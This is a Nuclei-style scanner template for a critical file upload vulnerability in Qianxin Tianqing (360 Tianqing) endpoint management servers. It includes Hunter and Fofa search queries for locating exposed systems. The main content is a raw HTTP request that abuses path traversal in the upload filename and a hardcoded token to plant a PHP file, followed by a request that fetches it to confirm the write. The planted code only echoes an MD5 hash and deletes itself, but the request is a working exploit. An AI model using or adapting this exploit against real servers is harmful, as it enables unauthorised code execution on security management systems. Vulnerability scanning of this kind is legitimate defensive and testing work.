id: qianxin-tianqing-rptsvr-fileupload

info:
  name: 奇安信天擎 RPTSVR 文件上传漏洞
  author: zan8in
  severity: critical
  description: |-
    Hunter: web.title=="360新天擎" || web.title=="360天擎终端安全管理系统"
    Fofa: "奇安信天擎"
  reference:
    - https://mp.weixin.qq.com/s/CkvAaxQThv_33e_CG9Md5w
  tags: qianxin,tianqing,fileupload
http:
  - raw:
      - |-
        POST /rptsvr/upload HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
        Connection: close
        Content-Length: 412
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate, br
        Accept-Language: en-US,en;q=0.5
        Content-Type: multipart/form-data;boundary=---------------------------55433477442814818502792421460
        Upgrade-Insecure-Requests: 1

        -----------------------------55433477442814818502792421460
        Content-Disposition: form-data; name="uploadfile"; filename="../../../application/api/controllers/TController1.php"
        Content-Type: text/x-python

        <?php echo(md5(1)); unlink(__FILE__); ?>
        -----------------------------55433477442814818502792421460
        Content-Disposition: form-data; name="token"

        skylar_report
        -----------------------------55433477442814818502792421460
      - |+
        GET /application/api/controllers/TController1.php HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

    matchers:
      - type: word
        part: body
        words:
          - 'c4ca4238a0b923820dcc509a6f75849b'
